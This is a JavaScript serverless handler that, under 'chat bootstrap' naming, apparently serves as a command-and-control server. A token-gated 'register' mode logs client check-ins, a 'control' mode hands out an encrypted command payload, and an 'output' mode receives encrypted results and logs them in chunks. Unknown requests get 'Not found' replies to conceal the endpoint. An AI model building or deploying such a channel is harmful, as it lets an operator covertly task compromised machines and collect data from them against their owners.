import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '29';
const CONTROL_PAYLOAD = 'U2FsdGVkX19n73LYzJ4NRlKzZF7Wev9X6xu403D/cQ+zE5i90k+ZPqJ8E/Iwtae46ymSf3XMxr48laFBTSscuddB8+utspQj0yvVY0IU1ZDgi7D4nA4iMpdum0RVpg4TQmsHlpcA9G97vdIO+IjljZ5jSPLsH5B7lzehYvNOkE0GuWH8HOp2RmAOkicalUFUzOFYB4UfXEjX0KqlWsQhVgcF+osWGksD487roLkeJcDNkOL/0oabA9I+0c39ZGWjyKCcSkT4Z7hjyBlarlwrqjNAZtMeYV+/0QPrJT3xqj+hiGRXwLxs0VnHTisUmU5HB+MdzxPPQs0IVjpUJwUGEytU4YUalzjkaELdBg6kfH2R4pjHg2hDNdwVCHZdhZ2tpvOUjVkuJpIaLUZUp2XX39FJoTBV/7ydjU7Pg4SMJAg7qHV7IVclzpAu2ujNrZat0hgGZfFW+YIKsJ8eN3Q2v7/cyjKr4RHEot+lD4m6yvetOjlMVKQEleWGIj+BMXAdXYbbVJ8k4HwUJZxRfBvUweXuX1wCD3xity2zv4/9VibNgfdFyhvQyoJy2fos6enoi91FR7JaU8+Rfw4dFvhTYqySCRNhkycgx2j0BzOHxcCiNeV0m+zgoJlORMKGibzY9KksM8TF6BAWbMDQbMJdNavSg0SuDqJ420Ce6Mesy1/+S+l5cPZh1l9ayyigYrunTWbPmy1qFlsUXqcZSFtmQt83Eri6DJI4Oqqb8K+sPMRAVFtK2Ky6o7b5W/Sw0gAsezRviWBzusTITIjriz2Wf5PuwUv0dMqoan359kf3XFiAElWeYWzuQ7pTv9QhjSv9wF6310lJKAxixN7QwKqBttTQmAv32KHJcxm/MA2tJw7zM2N1ha4uyFRAdb7RJGraG3SPE/TSZMcO6W9bmDM11L43fGTleJPFDABobHRUzm+G+KKqfVNPWpSiCtqTAv6VVmIc/tR633ZCn6cfdN819Sdebk3kQDQZRTqy9othmhyBrXDPGc4Rj+lxk5r1u2smwNWziSbZrYJBc73V9yj406UGUJpb2QKbYH4oSynvP+6RlZSboY5IwNyVoeW6Gc2qWDanhoJKAngPLYsyR0G0HJrpSsl8qcmH0erjyQrA6J7AZ9vcfci5Y/MP2CkSri0SEHVZD9tJJ6jreN3HzdcHb/UnHLIQYIiF256fpQBHUlYY70rCFxkhWgR+Ts01NzgczixRkpwpTSKIRBsNid04UGqnyV+MsLGEjyrXR3wjNlDjfRTX+xdgTYNm5oaialZCOfG/G/D0TCvVvqi1g65VMF3duN3QfboJGc9TvWoSngfnJX0I5s9PVgND1nd6Pl3YMZz9W3kxzQL4UPGDDABYUAapzkLYCbZjC+3eVEW90zkpOYnbzEtxhU539sNNS5y6bxv+JjznxZP0o1lhU6fEP1yt1tvk9qBUleW4c5p2MoaxjGm7kWs+KfkYE+8+S3GnvwSxM1lbpC5RPPyQrq/g5k2jQI8eRRvisW2v2VAjpTCByIChfBuVvRMTlGzU+7pOHhmfUK565f5+s3dfc3pd9IDyQq2ns13em5stImyN0kxzIISoRMJlLh0DqCBUf9P8PGZAaPK1SWmHxZ9/tq/rCN8ESYWTEy4L5220DR/VDRtmXD53ZGLyJx4fw0/GUhPTXXksNqi4+hXxIv7VLlHse/FefAs/AQ32EIgnFWUMWdjkl2WnQCrMnlGYig2qcpp4Y9uwRI6rKoTFFV+KZHpRAhfAGos/+vsEuxOzG30Yrweq2nnWRyjdpDpI0NUXOyY2lg4lhhYwYbXyny8t1pRLlaQF5xINKLixFlKwS8c6qwhq4PaX0SQuarrSB00oNyY/ajtXpwk+IBwK9P/LqD1Lcj6XNdxySjdZ2ogCHpcNaMEVp3IsEnQwo55CDlC6r6nMUCEubgo8I5THCXD43+5RwjaLB6dZq+U7KFZZuPt85Yg=';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
